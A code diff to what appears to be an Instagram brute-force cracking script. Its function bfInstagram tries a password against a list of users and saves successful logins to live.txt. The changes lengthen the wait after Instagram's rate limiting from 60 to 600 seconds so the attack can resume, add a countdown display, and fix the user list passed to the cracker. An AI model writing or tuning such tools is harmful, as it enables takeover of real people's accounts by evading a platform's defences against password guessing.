@@ -204,9 +204,10 @@ def bfInstagram(users, password, command, newpassword):
 				login = re.findall(r"\"authenticated\"\: (.*?)\,", result)[0]
 			except IndexError:
 				print(f"[{R + B}!{C}]Please wait a few minutes before you try again.")
-				t = 60
+				t = 600
 				while t:
-					print(f"[{R + B}!{C}]Restarting from {t}s", end="\r")
+					minu, sec = divmod(t, 60)
+					print(f"[{R + B}!{C}]Restarting from {minu}:{sec}", end="\r")
 					time.sleep(1)
 					t -= 1
 				continue
@@ -330,7 +331,7 @@ if __name__ == "__main__":
 
 			elif cmd.lower() == "n":
 				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(final, passwd, cmd, "")
+				result = bfInstagram(usr, passwd, cmd, "")
 				print(result)
 				print(f"[{G + B}+{C}]Saved on live.txt")
 				menu()
